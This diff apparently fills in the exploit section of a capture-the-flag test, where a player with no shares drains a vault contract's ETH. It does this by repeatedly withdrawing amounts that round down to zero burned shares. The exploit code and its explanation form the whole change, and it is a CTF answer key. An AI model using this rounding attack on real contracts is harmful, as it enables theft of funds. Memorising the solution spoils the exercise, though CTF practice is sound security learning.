@@ -19,6 +19,17 @@ describe("CTF", async function () {
     const sharesBefore = await pool.read.totalShares();
 
     // ---- YOUR EXPLOIT HERE (use `player` only) ----
+    // `withdraw` computes shares = floor(assets * totalShares / totalAssets).
+    // One share is worth ~1e10 wei, so asking for slightly less than one
+    // share's worth of ETH burns 0 shares while still paying out the ETH.
+    // The player holds no shares, so `sharesOf[player] -= 0` doesn't revert.
+    for (let i = 0; i < 5; i++) {
+      const totalShares = await pool.read.totalShares();
+      const totalAssets = await publicClient.getBalance({ address: pool.address });
+      // Largest `assets` with assets * totalShares < totalAssets → 0 shares.
+      const freeAssets = (totalAssets - 1n) / totalShares;
+      await pool.write.withdraw([freeAssets], { account: player.account });
+    }
 
     // ---- END OF EXPLOIT ----
 
